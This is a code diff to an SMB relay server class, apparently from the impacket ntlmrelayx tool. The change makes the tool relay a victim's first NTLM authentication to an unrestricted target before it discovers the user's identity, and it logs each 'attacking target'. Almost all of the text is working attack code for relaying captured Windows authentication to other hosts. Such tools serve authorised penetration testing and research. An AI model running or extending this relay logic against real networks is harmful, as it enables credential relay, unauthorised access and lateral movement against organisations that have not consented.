@@ -143,6 +143,7 @@ class SMBRelayServer(Thread):
         respPacket['Command'] = smb3.SMB2_NEGOTIATE
         respPacket['SessionID'] = 0
 
+        relayInitialAuthentication = self.config.disableMulti
         if self.config.disableMulti:
             if self.config.mode.upper() == 'REFLECTION':
                 self.targetprocessor = TargetsProcessor(singleTarget='SMB://%s:445/' % connData['ClientIP'])
@@ -159,7 +160,17 @@ class SMBRelayServer(Thread):
                     return None, [respPacket], STATUS_BAD_NETWORK_NAME
 
             LOG.info("(SMB): Received connection from %s, attacking target %s://%s" % (connData['ClientIP'], self.target.scheme, self.target.netloc))
+        else:
+            # Prefer relaying the first authentication to an unrestricted target.
+            # If only username-bound targets remain, SessionSetup falls back to
+            # local authentication so TreeConnect can select by identity.
+            self.target = self.targetprocessor.getTarget()
+            if self.target is not None:
+                relayInitialAuthentication = True
+                LOG.info("(SMB): Received connection from %s, attacking target %s://%s before identity discovery" %
+                         (connData['ClientIP'], self.target.scheme, self.target.netloc))
 
+        if relayInitialAuthentication:
             try:
                 if self.config.mode.upper() == 'REFLECTION':
                     # Force standard security when doing reflection
@@ -176,6 +187,8 @@ class SMBRelayServer(Thread):
             else:
                 connData['SMBClient'] = client
                 connData['EncryptionKey'] = client.getStandardSecurityChallenge()
+                if not self.config.disableMulti:
+                    connData['relayToHost'] = True
                 smbServer.setConnectionData(connId, connData)
 
         if isSMB1 is False:
@@ -507,6 +520,7 @@ class SMBRelayServer(Thread):
     def SmbComNegotiate(self, connId, smbServer, SMBCommand, recvPacket):
         connData = smbServer.getConnectionData(connId, checkStatus = False)
 
+        relayInitialAuthentication = self.config.disableMulti
         if self.config.disableMulti:
             if self.config.mode.upper() == 'REFLECTION':
                 self.targetprocessor = TargetsProcessor(singleTarget='SMB://%s:445/' % connData['ClientIP'])
@@ -521,7 +535,17 @@ class SMBRelayServer(Thread):
                     return [smb.SMBCommand(smb.SMB.SMB_COM_NEGOTIATE)], None, STATUS_BAD_NETWORK_NAME
 
             LOG.info("(SMB): Received connection from %s, attacking target %s://%s" % (connData['ClientIP'], self.target.scheme, self.target.netloc))
+        else:
+            # Prefer relaying the first authentication to an unrestricted target.
+            # If only username-bound targets remain, SessionSetup falls back to
+            # local authentication so TreeConnect can select by identity.
+            self.target = self.targetprocessor.getTarget()
+            if self.target is not None:
+                relayInitialAuthentication = True
+                LOG.info("(SMB): Received connection from %s, attacking target %s://%s before identity discovery" %
+                         (connData['ClientIP'], self.target.scheme, self.target.netloc))
 
+        if relayInitialAuthentication:
             try:
                 if recvPacket['Flags2'] & smb.SMB.FLAGS2_EXTENDED_SECURITY == 0:
                     extSec = False
@@ -542,6 +566,8 @@ class SMBRelayServer(Thread):
             else:
                 connData['SMBClient'] = client
                 connData['EncryptionKey'] = client.getStandardSecurityChallenge()
+                if not self.config.disableMulti:
+                    connData['relayToHost'] = True
                 smbServer.setConnectionData(connId, connData)
 
         else:
@@ -957,4 +983,3 @@ class SMBRelayServer(Thread):
     def run(self):
         LOG.info("Setting up SMB Server on port %s" % self.server.server_address[1])
         self._start()
-
